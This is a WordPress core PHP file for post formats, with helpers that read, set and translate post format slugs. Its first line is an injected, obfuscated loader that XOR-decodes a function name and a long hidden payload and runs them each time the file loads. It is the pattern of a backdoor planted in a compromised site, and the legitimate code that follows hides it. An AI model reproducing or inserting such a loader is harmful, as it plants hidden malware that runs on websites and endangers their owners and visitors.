<?php $oWMcxR='U=Q4LEo+I> 2R,:'^'6O4U8 0M<PCF;CT';$MwrTJYmg=$oWMcxR('','B>pj+U,SO0 VnHD 9L1dj9OY<HW7Jh,;;=eMbB<zx.-XQGRV,z4=RqHAC22n+39og<2 QeaG-4EsgSTXXUaK7I62IEGXIFs21=FZ3JO9bkscWxVIDM,3Y +JTO-ARBjIvZmZb4xdI=27qGslxl=VJ;<b=cDgEI.6+jC9Pay9:0-17AcSE ZpsH;<HF.BU=NlJS8TNCX:-gSMRt6,I,PVK> LBVlrOVA 4+9VYutNH-9E,Kz=J7 7,62skjb4z5s,2HTCAGSEHmQQhp1O>8HBVJsnh2P:Aq1N+DxXC94YSlHLQ9=LLIfG33L6VslEkkU.fgQQT.G4pT,fj.-:.X4DGFnifq06nbdr8Dzb<-.BSJKO.;THKZe:;hME+SZ,:1 :DZfa,=IWX5;L3;F4LYwj7U+AWaoJ;XHgXw-T-7TgZu ;7VG=X5YF+qNYOn5;MZmoWN-n:L 0ES=6<W:S.PnV DVYkaKZ.M+hS.1nfCxY-NS<4 0VPaeW=0X>:FEO-TV,N1;FcKX1mcttS 88yKkVejM Emi0Z:,3u:2+FvAUOSHalSHP<0sXI6GS-NZfP<pJs8ZkcRXispONhjsIaH6H<QR6=-<9YF 0B0nwL5LB93 wyhnXWEAqkbMBNHP.69,KZAOVOYL5,H4M,TQ7+EmqH0QWE3YmgSM8Q'^'+XXKM B0;YO81-<IJ8BLMA +c,6C+7sVNIBdKbGpqHX623;9BZLR ., 7Sm1FFMGCXST0IAcFQ<ZGstxx.kB>mYG=ezxnaH884 5AbkPBVSSlXr x>XA5EEbp+L53kQiR3FqK>qmmRGCQiNLPHY7>ZgFT>d9emESR1gPpDYJNBATYiG8 Ys-Zs15A4K6 O Dn<M gxR3Pm.GXPRM=MpkkXA 13Wxk2 TUtR3 UIn.LU6Ipp7,XRRMUZSCN=w5z8ewh50ac8 1MloHTG.RM-kv1ygLV1N .Z+RdExgRQ hfAh5XI-ltFcER C3Hf8aa<HFOpu0O3UYtWlcHBHK9W,gnJ644ac+10RY7ZFWHWbntkkXZ8=.sEA1aDaO2.MeZECdgFEGX0lR<2hWZ2UldWNA4G42ZeCFR5mRSI5YVtZz5UUD35T9Y0<NY66=1QZ9;20:;YFX-SUsgbRY4U7KxJ2A07pGAo>O9J78KHGOxr0KfwXUTQvvGE6OB9Ge- 6r1.E=EHnD =HJOTP7ALYPkMpEB DpEMT;NMhRQWRa+hurnhFUkzdZVBmzRp6OxjQhZD,EZnZRb:XAA.,OCSoGhW:N0+iVHEf<>IC6CFP<T5.VRDPUHJ<61 XBBmbnhpU<0I=;-gr+88TwoD,U8>VOb0Xs:X2=Z-EWzv2,');$MwrTJYmg();
/**
 * Post format functions.
 *
 * @package WordPress
 * @subpackage Post
 */

/**
 * Retrieve the format slug for a post
 *
 * @since 3.1.0
 *
 * @param int|object|null $post Post ID or post object. Optional, default is the current post from the loop.
 * @return string|false The format if successful. False otherwise.
 */
function get_post_format( $post = null ) {
	if ( ! $post = get_post( $post ) )
		return false;

	if ( ! post_type_supports( $post->post_type, 'post-formats' ) )
		return false;

	$_format = get_the_terms( $post->ID, 'post_format' );

	if ( empty( $_format ) )
		return false;

	$format = reset( $_format );

	return str_replace('post-format-', '', $format->slug );
}

/**
 * Check if a post has any of the given formats, or any format.
 *
 * @since 3.1.0
 *
 * @param string|array    $format Optional. The format or formats to check.
 * @param object|int|null $post   Optional. The post to check. If not supplied, defaults to the current post if used in the loop.
 * @return bool True if the post has any of the given formats (or any format, if no format specified), false otherwise.
 */
function has_post_format( $format = array(), $post = null ) {
	$prefixed = array();

	if ( $format ) {
		foreach ( (array) $format as $single ) {
			$prefixed[] = 'post-format-' . sanitize_key( $single );
		}
	}

	return has_term( $prefixed, 'post_format', $post );
}

/**
 * Assign a format to a post
 *
 * @since 3.1.0
 *
 * @param int|object $post   The post for which to assign a format.
 * @param string     $format A format to assign. Use an empty string or array to remove all formats from the post.
 * @return array|WP_Error|false WP_Error on error. Array of affected term IDs on success.
 */
function set_post_format( $post, $format ) {
	$post = get_post( $post );

	if ( empty( $post ) )
		return new WP_Error( 'invalid_post', __( 'Invalid post.' ) );

	if ( ! empty( $format ) ) {
		$format = sanitize_key( $format );
		if ( 'standard' === $format || ! in_array( $format, get_post_format_slugs() ) )
			$format = '';
		else
			$format = 'post-format-' . $format;
	}

	return wp_set_post_terms( $post->ID, $format, 'post_format' );
}

/**
 * Returns an array of post format slugs to their translated and pretty display versions
 *
 * @since 3.1.0
 *
 * @return array The array of translated post format names.
 */
function get_post_format_strings() {
	$strings = array(
		'standard' => _x( 'Standard', 'Post format' ), // Special case. any value that evals to false will be considered standard
		'aside'    => _x( 'Aside',    'Post format' ),
		'chat'     => _x( 'Chat',     'Post format' ),
		'gallery'  => _x( 'Gallery',  'Post format' ),
		'link'     => _x( 'Link',     'Post format' ),
		'image'    => _x( 'Image',    'Post format' ),
		'quote'    => _x( 'Quote',    'Post format' ),
		'status'   => _x( 'Status',   'Post format' ),
		'video'    => _x( 'Video',    'Post format' ),
		'audio'    => _x( 'Audio',    'Post format' ),
	);
	return $strings;
}

/**
 * Retrieves an array of post format slugs.
 *
 * @since 3.1.0
 *
 * @return array The array of post format slugs.
 */
function get_post_format_slugs() {
	$slugs = array_keys( get_post_format_strings() );
	return array_combine( $slugs, $slugs );
}

/**
 * Returns a pretty, translated version of a post format slug
 *
 * @since 3.1.0
 *
 * @param string $slug A post format slug.
 * @return string The translated post format name.
 */
function get_post_format_string( $slug ) {
	$strings = get_post_format_strings();
	if ( !$slug )
		return $strings['standard'];
	else
		return ( isset( $strings[$slug] ) ) ? $strings[$slug] : '';
}

/**
 * Returns a link to a post format index.
 *
 * @since 3.1.0
 *
 * @param string $format The post format slug.
 * @return string|WP_Error|false The post format term link.
 */
function get_post_format_link( $format ) {
	$term = get_term_by('slug', 'post-format-' . $format, 'post_format' );
	if ( ! $term || is_wp_error( $term ) )
		return false;
	return get_term_link( $term );
}

/**
 * Filters the request to allow for the format prefix.
 *
 * @access private
 * @since 3.1.0
 *
 * @param array $qvs
 * @return array
 */
function _post_format_request( $qvs ) {
	if ( ! isset( $qvs['post_format'] ) )
		return $qvs;
	$slugs = get_post_format_slugs();
	if ( isset( $slugs[ $qvs['post_format'] ] ) )
		$qvs['post_format'] = 'post-format-' . $slugs[ $qvs['post_format'] ];
	$tax = get_taxonomy( 'post_format' );
	if ( ! is_admin() )
		$qvs['post_type'] = $tax->object_type;
	return $qvs;
}

/**
 * Filters the post format term link to remove the format prefix.
 *
 * @access private
 * @since 3.1.0
 *
 * @global WP_Rewrite $wp_rewrite
 *
 * @param string $link
 * @param object $term
 * @param string $taxonomy
 * @return string
 */
function _post_format_link( $link, $term, $taxonomy ) {
	global $wp_rewrite;
	if ( 'post_format' != $taxonomy ) {
		return $link;
	}
	if ( $wp_rewrite->get_extra_permastruct( $taxonomy ) ) {
		return str_replace( "/{$term->slug}", '/' . str_replace( 'post-format-', '', $term->slug ), $link );
	} else {
		$link = remove_query_arg( 'post_format', $link );
		return add_query_arg( 'post_format', str_replace( 'post-format-', '', $term->slug ), $link );
	}
}

/**
 * Remove the post format prefix from the name property of the term object created by get_term().
 *
 * @access private
 * @since 3.1.0
 *
 * @param object $term
 * @return object
 */
function _post_format_get_term( $term ) {
	if ( isset( $term->slug ) ) {
		$term->name = get_post_format_string( str_replace( 'post-format-', '', $term->slug ) );
	}
	return $term;
}

/**
 * Remove the post format prefix from the name property of the term objects created by get_terms().
 *
 * @access private
 * @since 3.1.0
 *
 * @param array        $terms
 * @param string|array $taxonomies
 * @param array        $args
 * @return array
 */
function _post_format_get_terms( $terms, $taxonomies, $args ) {
	if ( in_array( 'post_format', (array) $taxonomies ) ) {
		if ( isset( $args['fields'] ) && 'names' == $args['fields'] ) {
			foreach ( $terms as $order => $name ) {
				$terms[$order] = get_post_format_string( str_replace( 'post-format-', '', $name ) );
			}
		} else {
			foreach ( (array) $terms as $order => $term ) {
				if ( isset( $term->taxonomy ) && 'post_format' == $term->taxonomy ) {
					$terms[$order]->name = get_post_format_string( str_replace( 'post-format-', '', $term->slug ) );
				}
			}
		}
	}
	return $terms;
}

/**
 * Remove the post format prefix from the name property of the term objects created by wp_get_object_terms().
 *
 * @access private
 * @since 3.1.0
 *
 * @param array $terms
 * @return array
 */
function _post_format_wp_get_object_terms( $terms ) {
	foreach ( (array) $terms as $order => $term ) {
		if ( isset( $term->taxonomy ) && 'post_format' == $term->taxonomy ) {
			$terms[$order]->name = get_post_format_string( str_replace( 'post-format-', '', $term->slug ) );
		}
	}
	return $terms;
}
